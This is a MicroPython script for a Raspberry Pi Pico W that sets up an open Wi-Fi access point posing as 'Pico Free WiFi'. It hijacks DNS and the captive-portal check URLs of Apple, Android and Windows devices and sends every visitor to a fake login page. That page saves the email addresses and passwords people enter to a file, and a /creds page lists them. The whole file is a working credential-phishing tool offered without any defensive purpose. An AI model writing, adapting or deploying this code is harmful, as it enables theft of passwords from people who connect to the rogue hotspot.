from phew import server, access_point, dns
from phew.server import redirect as go
from phew.template import render_template
import json
from machine import Pin, reset
import network
import time

DOMAIN = "wifi.login"

# LED
led = machine.Pin("LED", machine.Pin.OUT)
led.value(0)

# Json Funcs
def load():
    with open("config.json", "r") as file:
        daten = json.load(file)
        return daten
    
def save(data):
    with open("config.json", "w") as file:
        json.dump(data, file)
        
# Parsing Config File
try:
    CONFIG = load()
    SSID = CONFIG["ssid"]
except:
    CONFIG = {
        "creds": {},
        "ssid": "Pico Free WiFi"
}
    SSID = CONFIG["ssid"]
    save(CONFIG)

# Index
@server.route("/", methods=["GET", "POST"])
def index(req):
    if req.method == "GET":
        return render_template("html/portal.html")
    if req.method == "POST":
        username = req.form.get("email", None)
        password = req.form.get("password", None)
        data = load()
        data["creds"][username] = password
        save(data)
        return render_template("html/info.html")
    
# Portal Settings
@server.route("/creds", methods=["GET"])
def settings(req):
    if req.method == "GET":
        try:
            data = load()["creds"]
            liste = list(data.items())
            content = ""
            for tup in liste:
                content += f"{tup[0]}:{tup[1]}<br>"
            if content == "":
                content = "<center>No credentials in Database!</center>"
            
            content = open("html/creds.html", "r").read().replace("{{data}}", content)
            return content
        except:
            return "HTML Credit File not provided!"
    
@server.route("/clear", methods=["GET"])
def clear_creds(req):
    if req.method == "GET":
        ssid = load()["ssid"]
        save({
            "creds": {},
            "ssid": ssid
})
        return go(f"http://{DOMAIN}/creds")

@server.route("/ssid", methods=["GET", "POST"])
def ssid(req):
    if req.method == "GET":
        return render_template("html/ssid.html", ssid=SSID)
    if req.method == "POST":
        ssid = req.form.get("ssid", None)
        data = load()
        data["ssid"] = ssid
        save(data)
        reset()

# Apple
@server.route("/hotspot-detect.html", methods=["GET"])
def apple(req):
    return go(f"http://{DOMAIN}/")
    
# Android
@server.route("/generate_204", methods=["GET"])
def android(req):
    return go(f"http://{DOMAIN}/")

# Windows - Redirect
@server.route("/redirect", methods=["GET"])
def hotspot(req):
    return go(f"http://{DOMAIN}/")

# Windows 10 - ConnectTest
@server.route("/connecttest.txt", methods=["GET"])
def hotspot(req):
    return go(f"http://{DOMAIN}/")

# Windows 10 - NscI
@server.route("/nsci.txt", methods=["GET"])
def hotspot(req):
    return go(f"http://{DOMAIN}/")

@server.catchall()
def catch_all(req):
    return go(f"http://{DOMAIN}/")


ap = network.WLAN(network.AP_IF)
ap.active(False)
ap.config(security=0, essid=SSID)
ap.active(True)
ip = ap.ifconfig()[0]
dns.run_catchall(ip)
led.value(1)
server.run()